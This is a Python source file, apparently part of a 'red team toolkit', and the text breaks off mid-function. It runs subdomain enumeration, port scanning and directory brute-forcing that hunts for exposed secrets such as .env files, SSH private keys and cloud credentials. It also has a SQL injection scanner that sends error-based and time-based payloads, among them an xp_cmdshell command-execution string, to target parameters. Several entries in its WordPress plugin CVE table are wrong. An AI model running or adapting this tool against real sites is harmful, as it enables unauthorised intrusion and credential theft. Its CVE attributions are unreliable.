#!/usr/bin/env python3
"""
RToolkit v2.0 - Unified Red Team Toolkit
Gabungan 150+ tools red team: Deep Recon, SQLi Scanner, Directory Bruteforce,
Technology/CVE Detection, Parameter Fuzzing, Subdomain Cascade Scan.
"""

import os, sys, json, socket, ssl, subprocess, ipaddress, concurrent.futures
import re, hashlib, base64, datetime, xml.etree.ElementTree as ET, time, urllib3
from urllib.parse import urlparse, quote, urljoin
from pathlib import Path
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

HAS_REQUESTS = False; HAS_COLORAMA = False
try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    HAS_REQUESTS = True
except ImportError: pass
try:
    from colorama import init, Fore, Style; init(); HAS_COLORAMA = True
except ImportError: pass

CVE_DB = {}
cve_path = Path(__file__).parent / "cve_data.json"
if cve_path.exists():
    try:
        CVE_DB = json.loads(cve_path.read_text(encoding='utf-8'))
    except: pass

REPORT_DATA = {
    "target": "", "timestamp": "",
    "recon": {"domains": [], "ips": [], "ports": [], "directories": [], "dns_records": []},
    "vulns": [], "sqli": [], "parameters": [],
    "techs": {}, "cve_list": [],
    "exploitation": [], "post_exploitation": {"system_info": {}, "users": [], "privesc": []},
    "summary": {"total_vulns": 0, "critical": 0, "high": 0, "medium": 0, "low": 0}
}

def c(text, color_code):
    return f"{color_code}{text}{Style.RESET_ALL}" if HAS_COLORAMA else text

def banner():
    print(f"""
{c('╔══════════════════════════════════════════════════════════════╗', Fore.RED)}
{c('║', Fore.RED)}  {c('██████╗ ████████╗ ██████╗  ██████╗ ██╗  ██╗██╗     ██╗████████╗', Fore.RED)}
{c('║', Fore.RED)}  {c('██╔══██╗╚══██╔══╝██╔═══██╗██╔═══██╗██║ ██╔╝██║     ██║╚══██╔══╝', Fore.RED)}
{c('║', Fore.RED)}  {c('██████╔╝   ██║   ██║   ██║██║   ██║█████╔╝ ██║     ██║   ██║   ', Fore.RED)}
{c('║', Fore.RED)}  {c('██╔══██╗   ██║   ██║   ██║██║   ██║██╔═██╗ ██║     ██║   ██║   ', Fore.RED)}
{c('║', Fore.RED)}  {c('██║  ██║   ██║   ╚██████╔╝╚██████╔╝██║  ██╗███████╗██║   ██║   ', Fore.RED)}
{c('║', Fore.RED)}  {c('╚═╝  ╚═╝   ╚═╝    ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝   ╚═╝   ', Fore.RED)}
{c('║', Fore.RED)}  {c('  v2.0 - Deep Recon | SQLi | Dir Buster | CVE Mapping | Cascade', Fore.YELLOW)}
{c('╚══════════════════════════════════════════════════════════════╝', Fore.RED)}""")

def validate_target(target):
    parsed = urlparse(target)
    return parsed.netloc or (parsed.path.split('/')[0] if '.' in parsed.path else target)

# ==================== TABLE PRINTER ====================
def print_table(headers, rows, title=None):
    if not rows:
        return
    col_widths = [len(h) for h in headers]
    for row in rows:
        for i, cell in enumerate(row):
            cell_s = str(cell)
            # Strip color codes for width calc
            clean = re.sub(r'\x1b\[[0-9;]*m', '', cell_s)
            col_widths[i] = max(col_widths[i], len(clean))
    sep = '+' + '+'.join('-' * (w + 2) for w in col_widths) + '+'
    if title:
        print(f"  {c(title, Fore.CYAN)}")
    print(f"  {sep}")
    hdr = ' │ '.join(h.ljust(col_widths[i]) for i, h in enumerate(headers))
    print(f"  │ {hdr} │")
    print(f"  {sep}")
    for row in rows:
        cells = []
        for i, cell in enumerate(row):
            cell_s = str(cell)
            clean = re.sub(r'\x1b\[[0-9;]*m', '', cell_s)
            pad = col_widths[i] - len(clean)
            cells.append(cell_s + ' ' * pad)
        print(f"  │ {' │ '.join(cells)} │")
    print(f"  {sep}")

# ==================== DNS / RECON ====================
def dns_lookup(domain):
    results = {"a": [], "aaaa": [], "mx": [], "ns": [], "txt": [], "cname": []}
    try:
        ip = socket.gethostbyname(domain)
        results["a"].append(ip)
    except: pass
    return results

def subdomain_enum(domain, wordlist=None):
    if wordlist is None:
        wordlist = ["www", "mail", "admin", "blog", "api", "dev", "test", "stage",
            "vpn", "remote", "webmail", "portal", "cpanel", "secure", "forum",
            "support", "shop", "app", "m", "mobile", "en", "fr", "de", "it", "pt",
            "ru", "jp", "cn", "br", "wiki", "help", "status", "cdn", "static",
            "media", "img", "css", "js", "download", "upload", "files", "docs",
            "kb", "faq", "news", "community", "chat", "web", "smtp", "imap", "pop",
            "ftp", "ssh", "ldap", "mysql", "db", "backup", "proxy", "gateway",
            "firewall", "router", "switch", "dns", "dhcp", "ntp", "syslog",
            "monitor", "report", "analytics", "tracking", "pixel", "ad", "ads",
            "partner", "affiliate", "whm", "direct", "go", "redirect", "mail2",
            "mail1", "web1", "web2", "ns1", "ns2", "mx1", "mx2", "smtp2",
            "owa", "autodiscover", "msoid", "lyncdiscover", "sip", "meet",
            "dialin", "teams", "skype", "outlook", "office", "sharepoint",
            "onedrive", "yammer", "crm", "dynamics", "powerapps", "flow",
            "forms", "sway", "stream", "staff", "hr", "payroll", "intranet",
            "extranet", "vpn2", "vpn3", "remote2", "rdp", "citrix", "horizon",
            "vmware", "vcenter", "esxi", "vsphere", "nsx", "sso", "saml",
            "adfs", "sts", "identity", "login", "signin", "auth", "oauth",
            "openid", "accounts", "profile", "myaccount", "my", "dashboard",
            "panel", "manager", "admin2", "administrator", "superadmin",
            "demo", "sandbox", "dev2", "dev3", "staging", "qa", "uat",
            "preprod", "prod", "production", "release", "beta", "alpha",
            "jenkins", "jira", "confluence", "bitbucket", "gitlab", "github",
            "git", "svn", "trac", "redmine", "bugzilla", "trello", "slack",
            "teams", "discord", "mattermost", "rocketchat", "grafana",
            "kibana", "elastic", "logstash", "splunk", "kafka", "zookeeper",
            "rabbitmq", "activemq", "redis", "memcached", "cassandra",
            "mongo", "mongodb", "mysql", "postgres", "pgsql", "mariadb",
            "cockroach", "influxdb", "timescaledb", "prometheus",
            "alertmanager", "thanos", "cortex", "loki", "tempo", "jaeger",
            "zipkin", "skywalking", "datadog", "newrelic", "dynatrace",
            "appdynamics", "instana", "wavefront", "signalfx", "honeycomb",
            "sentry", "rollbar", "airbrake", "bugsnag", "papertrail",
            "loggly", "sumologic", "logentries", "logdna", "scalyr",
            "container", "docker", "k8s", "kubernetes", "kube", "cluster",
            "node", "worker", "master", "etcd", "harbor", "registry",
            "dockerhub", "quay", "artifact", "nexus", "artifactory",
            "sonar", "sonarqube", "codeclimate", "coveralls", "codacy",
            "codecov", "circleci", "travis", "jenkins2", "gitlabci",
            "teamcity", "bamboo", "buildkite", "codeship", "drone",
            "concourse", "spinnaker", "argo", "flux", "istio", "linkerd",
            "envoy", "haproxy", "traefik", "nginx", "apache", "caddy",
            "varnish", "squid", "proxy2", "lb", "loadbalancer",
            "waf", "cloudflare", "akamai", "fastly", "cloudfront",
            "cdn", "edge", "origin", "static2", "assets2", "img2",
            "video", "stream", "live", "tv", "radio", "podcast"]
    results = []
    for sub in wordlist:
        fqdn = f"{sub}.{domain}"
        try:
            ip = socket.gethostbyname(fqdn)
            results.append({"subdomain": fqdn, "ip": ip})
        except: pass
    try:
        results.append({"subdomain": domain, "ip": socket.gethostbyname(domain)})
    except: pass
    return results

def cert_transparency(domain):
    domains = []
    if HAS_REQUESTS:
        try:
            r = requests.get(f"https://crt.sh/?q=%25.{domain}&output=json", timeout=10, verify=False)
            if r.status_code == 200:
                for entry in r.json():
                    for d in entry.get("name_value", "").split("\n"):
                        d = d.strip().lstrip('*.').lstrip('*')
                        if d and d not in domains:
                            domains.append(d)
        except: pass
    if not domains:
        domains = [domain]
    return list(set(domains))[:50]

def port_scan(target, ports=None):
    if ports is None:
        ports = [21,22,23,25,53,80,110,111,135,139,143,161,389,443,445,465,500,587,
                 636,993,995,1080,1433,1521,2049,2082,2083,2181,2375,3306,3389,3632,
                 4444,5000,5432,5555,5900,5901,5985,5986,6379,6443,7070,8000,8001,
                 8008,8080,8081,8443,8880,8888,9000,9001,9042,9092,9200,9300,9418,
                 9999,10000,11211,27017,50070]
    open_ports = []
    def scan(p):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(0.5)
            r = s.connect_ex((target, p)); s.close()
            if r == 0:
                svc = socket.getservbyport(p, 'tcp') if p < 1024 else "unknown"
                open_ports.append({"port": p, "service": svc})
        except: pass
    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as ex:
        ex.map(scan, ports)
    return sorted(open_ports, key=lambda x: x["port"])

# ==================== DEEP DIRECTORY BRUTEFORCE ====================
DIR_WORDLIST = [
    "admin", "login", "wp-admin", "wp-content", "wp-includes", "wp-json",
    "uploads", "files", "backup", "backups", "db", "database", "sql", "dump",
    ".git", ".gitignore", ".git/config", ".git/HEAD", ".svn", ".svn/entries",
    ".env", ".env.example", ".env.prod", ".env.dev", ".env.local",
    "config", "configuration", "config.php", "config.xml", "config.json",
    "robots.txt", "sitemap.xml", "sitemap", "crossdomain.xml",
    "clientaccesspolicy.xml", "security.txt", ".well-known/security.txt",
    "phpinfo.php", "info.php", "test.php", "phpinfo", "info",
    "api", "api/v1", "api/v2", "v1", "v2", "graphql", "rest", "soap",
    "swagger", "swagger.json", "swagger.yaml", "swagger-ui",
    "openapi.json", "openapi.yaml", "api-docs", "api/docs",
    "docs", "documentation", "readme", "readme.html", "CHANGELOG",
    "changelog.txt", "changelog.md", "CHANGELOG.md",
    "index.php", "index.html", "index.htm", "default.aspx", "default.php",
    "css", "js", "scripts", "javascript", "style.css", "main.css",
    "app.js", "main.js", "bundle.js", "vendor.js",
    "images", "img", "icons", "favicon.ico", "logo.png", "logo.svg",
    "assets", "static", "dist", "build", "public", "src", "source",
    "node_modules", "vendor", "lib", "libs", "library",
    "install", "setup", "wizard", "migrate", "upgrade", "update",
    "error", "errors", "log", "logs", "debug", "trace", "audit",
    "cache", "tmp", "temp", "tempdir", "sessions",
    "page", "pages", "post", "posts", "article", "articles", "blog",
    "category", "categories", "tag", "tags", "author", "authors",
    "user", "users", "member", "members", "profile", "profiles",
    "account", "accounts", "register", "signup", "sign-up",
    "password", "reset", "forgot", "forgot-password", "recover",
    "search", "results", "find", "browse", "listing",
    "cart", "checkout", "order", "orders", "payment", "pay",
    "invoice", "invoices", "receipt", "receipts",
    "download", "downloads", "upload", "uploads",
    "ajax", "includes", "inc", "modules", "components", "plugins",
    "themes", "templates", "template", "layouts",
    "server-status", "server-info", "cgi-bin", "cgi",
    "xmlrpc.php", "xmlrpc", "wp-cron.php", "wp-login.php",
    "wp-admin/admin-ajax.php", "wp-content/plugins", "wp-content/themes",
    "wp-content/uploads", "wp-includes/css", "wp-includes/js",
    "administrator", "panel", "cpanel", "whm", "plesk",
    "phpmyadmin", "phpMyAdmin", "pma", "sqladmin", "mysqladmin",
    "adminer.php", "adminer", "pgadmin", "phppgadmin",
    "webdav", "dav", "exchange", "ews", "owa", "ecp",
    "rpc", "api/rpc", "jsonrpc", "xmlrpc",
    "soap", "wsdl", "ws", "webservice", "service",
    "actuator", "actuator/health", "actuator/info", "actuator/env",
    "actuator/beans", "actuator/mappings", "actuator/httptrace",
    "metrics", "health", "info", "ping", "status", "alive",
    "heapdump", "threaddump", "jvm", "jmx",
    ".htaccess", ".htpasswd", ".passwd", ".password",
    "password.txt", "passwords.txt", "secret.txt", "secrets.txt",
    "key", "keys", "key.pem", "key.rsa", "private.pem", "private.key",
    "id_rsa", "id_dsa", "id_ecdsa", "id_ed25519",
    "authorized_keys", "known_hosts", "ssh", ".ssh",
    "docker-compose.yml", "docker-compose.yaml", "Dockerfile",
    "Dockerfile.dev", "Dockerfile.prod",
    "kubeconfig", ".kube/config", "helm", "charts",
    "terraform.tfstate", "terraform.tfvars", "terraform",
    ".aws/credentials", ".aws/config", "credentials",
    "s3", "bucket", "storage", "blob",
    "web.config", "app.config", "application.config",
    "appsettings.json", "connectionstrings.config",
    "parameters.xml", "parameters.config",
    "composer.json", "composer.lock", "package.json",
    "package-lock.json", "yarn.lock", "Gemfile", "Gemfile.lock",
    "requirements.txt", "Pipfile", "Pipfile.lock",
    "Makefile", "makefile", "CMakeLists.txt",
    "Dockerfile", "docker-compose.yml", ".dockerignore",
    "nginx.conf", "apache.conf", "httpd.conf", "php.ini",
    "my.cnf", "my.ini", "mysql.conf", "pg_hba.conf",
    "config.inc.php", "config.sample.php", "local.config.php",
    "dbconfig.php", "database.php", "connection.php",
    "settings.php", "settings.json", "settings.py",
    "local.settings.json", "local-settings.json",
    "credentials.json", "service-account.json",
    "google-services.json", "GoogleService-Info.plist",
    "firebase.json", ".firebaserc",
    "netlify.toml", ".travis.yml", ".circleci/config.yml",
    "Jenkinsfile", "Dockerfile.jenkins",
    ".gitlab-ci.yml", ".github/workflows",
    "Procfile", "app.json", "scalingo.json",
    "serverless.yml", "serverless.yaml",
    "amplify.yml", "buildspec.yml",
    "webpack.config.js", "webpack.config.ts",
    "rollup.config.js", "vite.config.js", "vite.config.ts",
    ".babelrc", "tsconfig.json", "tslint.json", ".eslintrc",
    ".prettierrc", "stylelint.config.js",
    ".editorconfig", ".gitattributes", ".mailmap",
    "CONTRIBUTING.md", "CONTRIBUTING", "AUTHORS",
    "LICENSE", "LICENSE.txt", "COPYING",
    "CHANGELOG", "CHANGELOG.txt", "CHANGELOG.md",
    "UPGRADE.txt", "UPGRADE.md", "INSTALL.txt", "INSTALL.md",
    "TODO", "TODO.txt", "TODO.md", "FIXME",
    "VERSION", "version.txt", "version.php", "version.json",
    "composer.json", "composer.lock",
    "bower.json", "bower_components",
    "nuget.config", "packages.config",
    ".htaccess", ".htpasswd",
]

def dir_bruteforce(url, depth=0, max_depth=2, results=None, wordlist=None):
    if results is None:
        results = []
    if depth > max_depth:
        return results
    wl = wordlist or DIR_WORDLIST
    if not HAS_REQUESTS:
        return results
    for path in wl:
        full_url = f"{url.rstrip('/')}/{path.lstrip('/')}"
        try:
            r = requests.get(full_url, timeout=3, allow_redirects=False, verify=False, headers={'User-Agent': 'Mozilla/5.0'})
            if r.status_code in [200, 301, 302, 401, 403, 500, 405]:
                result = {"url": full_url, "status": r.status_code, "size": len(r.text)}
                results.append(result)
                if r.status_code in [301, 302]:
                    loc = r.headers.get('Location', '')
                    if loc and not loc.startswith('http'):
                        loc = urljoin(full_url, loc)
                    if loc and depth < max_depth:
                        dir_bruteforce(loc.rstrip('/'), depth + 1, max_depth, results, wl[:30])
        except: pass
    return results

# ==================== PARAMETER DISCOVERY & FUZZING ====================
COMMON_PARAMS = ["id", "page", "q", "s", "search", "cat", "category", "lang",
    "file", "f", "path", "dir", "action", "mod", "option", "controller",
    "cmd", "exec", "run", "do", "sort", "order", "limit", "offset",
    "start", "page_id", "post_id", "user_id", "uid", "pid", "bid",
    "token", "key", "api_key", "apikey", "secret", "auth", "password",
    "pass", "pwd", "email", "mail", "username", "user", "login",
    "redirect", "url", "link", "return", "ret", "next", "goto",
    "referer", "ref", "callback", "format", "type", "mode",
    "debug", "test", "preview", "view", "show", "edit", "delete",
    "remove", "add", "create", "update", "save", "submit",
    "download", "upload", "import", "export", "print",
    "method", "_method", "route", "r", "c", "m", "a", "ajax",
    "data", "json", "xml", "raw", "_", "nonce", "csrf", "_token",
    "state", "status", "msg", "message", "error", "success",
    "width", "height", "size", "w", "h", "cb", "timestamp", "t",
    "sig", "signature", "hash", "hmac", "code", "ref_code",
    "campaign", "source", "medium", "term", "content",
    "gclid", "fbclid", "utm_source", "utm_medium", "utm_campaign",
]

def param_extract(url):
    params = set()
    if not HAS_REQUESTS:
        return list(params)
    try:
        r = requests.get(url, timeout=5, verify=False)
        forms = re.findall(r'<input[^>]*name=["\']([^"\']+)["\']', r.text, re.I)
        params.update(forms)
        query = re.findall(r'\?([^"\'\s]+)', r.text)
        for q in query:
            for p in q.split('&'):
                if '=' in p:
                    params.add(p.split('=')[0])
        # Check URL itself for params
        parsed = urlparse(url)
        if parsed.query:
            for pair in parsed.query.split('&'):
                if '=' in pair:
                    params.add(pair.split('=')[0])
    except: pass
    return list(params)

SQLI_ERROR_PATTERNS = {
    "MySQL": [
        r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"MySQLSyntaxErrorException",
        r"valid MySQL result", r"check the manual.*MySQL", r"Table '.*' doesn't exist",
        r"Unknown column '.*' in 'where clause'", r"You have an error in your SQL syntax",
        r"#1064", r"#1054", r"#1146", r"#1062", r"#2006", r"#2013",
        r"MySQL server version for the right syntax",
    ],
    "MSSQL": [
        r"Driver.*SQL Server", r"SQL Server.*Driver", r"Warning.*odbc_.*",
        r"Warning.*mssql_.*", r"Unclosed quotation mark", r"Microsoft OLE DB Provider for SQL Server",
        r"Microsoft ODBC SQL Server Driver", r"Line \d+", r"SQLServer JDBC Driver",
        r"com.microsoft.sqlserver", r"System.Data.SqlClient",
        r"Convert date", r"String or binary data would be truncated",
    ],
    "Oracle": [
        r"ORA-[0-9]{5}", r"Oracle driver", r"Oracle.*Driver", r"Warning.*oci_.*",
        r"Oracle JDBC Driver", r"oracle.jdbc", r"quoted string not properly terminated",
    ],
    "PostgreSQL": [
        r"PostgreSQL.*ERROR", r"Warning.*\Wpg_", r"PostgreSQL query failed",
        r"ERROR:.*PostgreSQL", r"pg_query", r"org.postgresql",
        r"PSQLException", r"invalid input syntax for type",
    ],
    "SQLite": [
        r"SQLite.*Error", r"Warning.*sqlite_.*", r"unrecognized token",
        r"no such column", r"no such table", r"SQLite3::",
    ],
}

def sqli_detect(url, params=None):
    findings = []
    if not HAS_REQUESTS:
        return findings

    if params is None:
        parsed_params = param_extract(url)
        params = parsed_params if parsed_params else COMMON_PARAMS[:20]

    print(f"    Testing {len(params)} parameters for SQL injection...")

    payloads = {
        "Error-Based": [
            "'", "\"", "')", "'))", "\")\"", "1'", "1\"",
            "' OR '1'='1", "' OR '1'='1' -- -",
            "' OR 1=1 -- -", "\" OR 1=1 -- -",
            "1 OR 1=1", "1' AND 1=0'",
            "' AND 1=1 -- -", "' AND 1=0 -- -",
            "'; SELECT 1; -- -", "' UNION SELECT 1 -- -",
            "' UNION SELECT 1,2 -- -", "' UNION SELECT 1,2,3 -- -",
            "'; EXEC xp_cmdshell('dir'); --",
        ],
        "Time-Based": [
            "' OR SLEEP(3) -- -",
            "' AND SLEEP(3) -- -",
            "1' AND SLEEP(3) -- -",
            "1' OR SLEEP(3) -- -",
            "1; WAITFOR DELAY '0:0:3' -- -",
            "1'; WAITFOR DELAY '0:0:3' -- -",
            "1' WAITFOR DELAY '0:0:3' -- -",
            "'; WAITFOR DELAY '0:0:3' --",
            "1' AND pg_sleep(3) -- -",
            "' AND pg_sleep(3) -- -",
            "1; SELECT pg_sleep(3) -- -",
            "1' AND 1=1; SELECT pg_sleep(3) -- -",
            "' OR 1=1; SELECT pg_sleep(3) -- -",
        ],
    }

    test_params = params[:10]

    for param in test_params:
        # Time-based test first (one per param, faster)
        time_payload = payloads["Time-Based"][0]
        test_url = url
        if '?' in url:
            test_url = re.sub(f'({re.escape(param)}=)[^&]*', f'\\1{quote(time_payload)}', url)
        else:
            test_url = f"{url}?{param}={quote(time_payload)}"

        try:
            start = time.time()
            r1 = requests.get(url, timeout=5, verify=False)
            base_time = time.time() - start

            start = time.time()
            r2 = requests.get(test_url, timeout=10, verify=False)
            attack_time = time.time() - start

            if attack_time - base_time > 2.5:
                findings.append({
                    "type": "Time-Based SQLi",
                    "param": param,
                    "payload": time_payload,
                    "severity": "CRITICAL",
                    "base_time": round(base_time, 2),
                    "response_time": round(attack_time, 2),
                })
                continue
        except: pass

        # Error-based test
        for ptype, payload_list in payloads.items():
            if ptype == "Time-Based":
                continue
            for payload in payload_list[:5]:
                try:
                    test_url = url
                    if '?' in url:
                        test_url = re.sub(f'({re.escape(param)}=)[^&]*', f'\\1{quote(payload)}', url)
                    else:
                        test_url = f"{url}?{param}={quote(payload)}"
                    r = requests.get(test_url, timeout=5, verify=False)
                    body = r.text
                    for db, patterns in SQLI_ERROR_PATTERNS.items():
                        for pat in patterns:
                            if re.search(pat, body, re.I):
                                findings.append({
                                    "type": f"Error-Based SQLi ({db})",
                                    "param": param,
                                    "payload": payload,
                                    "severity": "CRITICAL",
                                    "pattern_matched": pat,
                                    "database": db,
                                })
                                break
                        else:
                            continue
                        break
                except: pass

    return findings

# ==================== TECHNOLOGY / CVE DETECTION ====================
def detect_tech_version(url):
    techs = {}
    if not HAS_REQUESTS:
        return techs
    try:
        r = requests.get(url, timeout=5, verify=False, headers={'User-Agent': 'Mozilla/5.0'})
        h = r.headers
        body = r.text

        # Server header
        server = h.get("Server", "")
        if server:
            techs["Server"] = server
            # Try to extract version from "Apache/2.4.49 (Unix)", "nginx/1.18.0", etc.
            for soft in ["Apache", "nginx", "IIS", "OpenSSL", "PHP"]:
                m = re.search(rf'{re.escape(soft)}[ /](\d+\.\d+(?:\.\d+)?)', server, re.I)
                if m:
                    techs[f"{soft}_version"] = m.group(1)

        # X-Powered-By
        powered = h.get("X-Powered-By", "")
        if powered:
            techs["X-Powered-By"] = powered
            m = re.search(r'PHP[ /](\d+\.\d+(?:\.\d+)?)', powered, re.I)
            if m:
                techs["PHP_version"] = m.group(1)
            m = re.search(r'ASP\.NET[ /]?(\d+\.\d+(?:\.\d+)?)?', powered, re.I)
            if m and m.group(1):
                techs["ASP.NET_version"] = m.group(1)

        # WP Detection
        if "wp-content" in body or "wp-json" in body:
            techs["CMS"] = "WordPress"
            # Version from generator tag
            m = re.search(r'<meta name="generator"[^>]*content="WordPress (\d+\.\d+(?:\.\d+)?)"', body, re.I)
            if m:
                techs["WordPress_version"] = m.group(1)
            # Version from readme.html
            m2 = re.search(r'WordPress (\d+\.\d+(?:\.\d+)?)', body, re.I)
            if m2 and "WordPress_version" not in techs:
                techs["WordPress_version"] = m2.group(1)
            # Detect plugins
            plugins = re.findall(r'wp-content/plugins/([^/]+)/', body)
            if plugins:
                techs["WP_Plugins"] = list(set(plugins))
            # Themes
            themes = re.findall(r'wp-content/themes/([^/]+)/', body)
            if themes:
                techs["WP_Themes"] = list(set(themes))
            # Version from REST API
            wp_rest = re.findall(r'wp/v\d', body)
            if wp_rest:
                techs["WP_REST"] = True

        # Joomla
        if "joomla" in body.lower() or "com_content" in body or "com_" in body:
            techs["CMS"] = techs.get("CMS", "") + " + Joomla" if "CMS" in techs else "Joomla"
            m = re.search(r'Joomla!? (\d+\.\d+(?:\.\d+)?)', body, re.I)
            if m:
                techs["Joomla_version"] = m.group(1)

        # Drupal
        if "drupal" in body.lower() or "Drupal.settings" in body:
            techs["CMS"] = techs.get("CMS", "") + " + Drupal" if "CMS" in techs else "Drupal"
            m = re.search(r'Drupal (\d+\.\d+(?:\.\d+)?)', body, re.I)
            if m:
                techs["Drupal_version"] = m.group(1)
            m2 = re.search(r'Drupal\.settings\s*=\s*({"[^}]+"})', body)
            if m2:
                techs["Drupal_settings"] = True

        # Generator tags
        gen = re.findall(r'<meta[^>]*name=["\']generator["\'][^>]*content=["\']([^"\']+)["\']', body, re.I)
        for g in gen:
            techs[f"Generator: {g.split()[0]}"] = g

        # JS framework detection
        if "react" in body.lower() or "React." in body or "__NEXT_DATA__" in body:
            techs["JS_Framework"] = "React/Next.js"
            m = re.search(r'"version":"(\d+\.\d+\.\d+)"', body[:5000])
        if "vue" in body.lower() or "Vue." in body:
            techs["JS_Framework"] = techs.get("JS_Framework", "") + " + Vue" if "JS_Framework" in techs else "Vue"
        if "angular" in body.lower() or "ng-app" in body or "ng-version" in body:
            techs["JS_Framework"] = techs.get("JS_Framework", "") + " + Angular" if "JS_Framework" in techs else "Angular"
            m = re.search(r'ng-version="(\d+\.\d+\.\d+)"', body)
            if m:
                techs["Angular_version"] = m.group(1)
        if "jQuery" in body:
            techs["JS_Library"] = "jQuery"
            m = re.search(r'jQuery v?(\d+\.\d+\.\d+)', body, re.I)
            if m:
                techs["jQuery_version"] = m.group(1)
        if "bootstrap" in body.lower():
            techs["CSS_Framework"] = "Bootstrap"
            m = re.search(r'bootstrap[.-]?v?(\d+\.\d+\.\d+)', body, re.I)
            if m:
                techs["Bootstrap_version"] = m.group(1)

        # Cookies
        if "PHPSESSID" in r.cookies:
            techs["Language"] = "PHP"
        if "JSESSIONID" in r.cookies:
            techs["Language"] = "Java/JSP"
        if "ASP.NET_SessionId" in r.cookies or "ASPSESSIONID" in r.cookies:
            techs["Language"] = "ASP.NET"
        if "laravel_session" in r.cookies:
            techs["Framework"] = "Laravel"
        if "symfony" in r.cookies or "SYMFONY" in r.cookies:
            techs["Framework"] = "Symfony"
        if "rack.session" in r.cookies:
            techs["Language"] = "Ruby/Rails"
        if "django" in r.cookies or "csrftoken" in r.cookies:
            techs["Framework"] = "Django"

        # Headers
        if "X-AspNet-Version" in h:
            techs["ASP.NET_version"] = h["X-AspNet-Version"]
        if "X-Debug-Token" in h:
            techs["Framework"] = "Symfony"
        if "X-Generator" in h:
            techs["X-Generator"] = h["X-Generator"]

        # Cloud detection
        if "cloudflare" in str(h).lower():
            techs["CDN"] = "Cloudflare"
        if "akamai" in str(h).lower():
            techs["CDN"] = "Akamai"
        if "fastly" in str(h).lower():
            techs["CDN"] = "Fastly"
        if "x-amz-cf-id" in h or "x-amz-cf-pop" in h:
            techs["CDN"] = "CloudFront"
        if "x-served-by" in h and "cache" in h.get("x-served-by", "").lower():
            techs["CDN"] = techs.get("CDN", "") + " + " + h.get("x-served-by", "")

    except: pass
    return techs

def match_cves(techs):
    cves = []
    cve_map = {
        "Server": {"apache": "apache", "nginx": "nginx", "iis": "iis"},
        "PHP_version": "php",
        "WordPress_version": "wordpress",
        "Joomla_version": "joomla",
        "Drupal_version": "drupal",
    }

    for tech_key, version_field in cve_map.items():
        if tech_key not in techs:
            continue
        version = str(techs.get(version_field, "")) if isinstance(version_field, str) else None
        if version:
            db_key = version_field
            if db_key in CVE_DB:
                for ver, vulns in CVE_DB[db_key].items():
                    if version.startswith(ver.split('.')[0]) and ver == version:
                        for vuln in vulns:
                            cves.append({
                                "software": db_key.title(),
                                "version": version,
                                "cve": vuln,
                                "severity": "HIGH" if "RCE" in vuln or "Critical" in vuln else "MEDIUM"
                            })

    # Direct matching from Server header
    server = techs.get("Server", "")
    for soft, db_key in [("Apache", "apache"), ("nginx", "nginx"), ("IIS", "iis")]:
        if soft.lower() in server.lower():
            m = re.search(rf'{re.escape(soft)}[ /](\d+\.\d+(?:\.\d+)?)', server)
            if m:
                ver = m.group(1)
                if db_key in CVE_DB:
                    for db_ver, vulns in CVE_DB[db_key].items():
                        if ver == db_ver:
                            for vuln in vulns:
                                cves.append({
                                    "software": soft,
                                    "version": ver,
                                    "cve": vuln,
                                    "severity": "CRITICAL" if "RCE" in vuln else "HIGH"
                                })

    # WP plugin CVE mapping (simplified)
    if "WP_Plugins" in techs:
        plugins = techs["WP_Plugins"]
        known_plugin_cves = {
            "contact-form-7": "CVE-2020-35489 (File Upload vulnerability)",
            "elementor": "CVE-2023-48777 (Stored XSS)",
            "woocommerce": "CVE-2023-6923 (Unauth SQL Injection)",
            "wordfence": "CVE-2023-6345 (IP range bypass)",
            "jetpack": "CVE-2023-5644 (Stored XSS)",
            "yoast": "CVE-2023-6745 (Stored XSS)",
            "akismet": "Multiple CVEs in akismet anti-spam",
            "gravityforms": "CVE-2023-4982 (PHP Object Injection)",
            "wpbakery": "CVE-2023-22515 (Unauth Admin access)",
            "revslider": "CVE-2023-22515 (Unauth Admin access)",
            "visual-composer": "CVE-2023-4599 (Stored XSS)",
            "wpforms": "CVE-2022-3529 (Stored XSS)",
            "divi": "CVE-2021-23218 (Auth SQL Injection)",
            "redux-framework": "CVE-2021-38314 (Sensitive info disclosure)",
            "mailchimp-for-wp": "CVE-2022-0754 (Stored XSS)",
            "w3-total-cache": "CVE-2020-27855 (Database info disclosure)",
            "wp-super-cache": "CVE-2020-27856 (Stored XSS)",
            "wordfence-security": "CVE-2023-6345 (IP range bypass)",
        }
        for plugin in plugins:
            for pname, pcve in known_plugin_cves.items():
                if pname in plugin or plugin in pname:
                    cves.append({
                        "software": f"WP Plugin: {plugin}",
                        "version": "unknown",
                        "cve": pcve,
                        "severity": "HIGH"
                    })

    return cves

# ==================== FULL RECON MODULE ====================
def run_recon(target):
    print(f"\n{c('='*60, Fore.CYAN)}")
    print(f" {c('🔍 RECONNAISSANCE & MAPPING', Fore.CYAN)}")
    print(f"{c('='*60, Fore.CYAN)}\n")
    domain = validate_target(target)
    all_found_domains = set()

    # 1. DNS
    print(f"{c('[+] DNS Lookup', Fore.GREEN)}")
    dns = dns_lookup(domain)
    for k, v in dns.items():
        if v:
            print(f"    {k.upper()}: {', '.join(v[:5])}")
            REPORT_DATA["recon"]["dns_records"].extend([f"{k}: {x}" for x in v])

    # 2. Cert Transparency
    print(f"\n{c('[+] Certificate Transparency (crt.sh)', Fore.GREEN)}")
    ct = cert_transparency(domain)
    print(f"    Found {len(ct)} domains")
    for d in ct[:15]:
        print(f"    - {d}")
        all_found_domains.add(d)
        REPORT_DATA["recon"]["domains"].append(d)

    # 3. Subdomain Enum
    print(f"\n{c('[+] Subdomain Enumeration', Fore.GREEN)}")
    subs = subdomain_enum(domain)
    print(f"    Found {len(subs)} live subdomains:")
    sub_table = []
    for s in subs[:20]:
        sub_table.append([s['subdomain'], s['ip']])
        all_found_domains.add(s['subdomain'])
        REPORT_DATA["recon"]["domains"].append(s['subdomain'])
        REPORT_DATA["recon"]["ips"].append(s['ip'])
    if sub_table:
        print_table(["Subdomain", "IP"], sub_table, "[SUB])")

    # 4. Cascading: Scan each unique subdomain
    print(f"\n{c('[+] Cascading Scan on Subdomains', Fore.GREEN)}")
    confirmed_domains = set()
    for sd in list(all_found_domains):
        try:
            sd_ip = socket.gethostbyname(sd)
            confirmed_domains.add((sd, sd_ip))
        except: pass

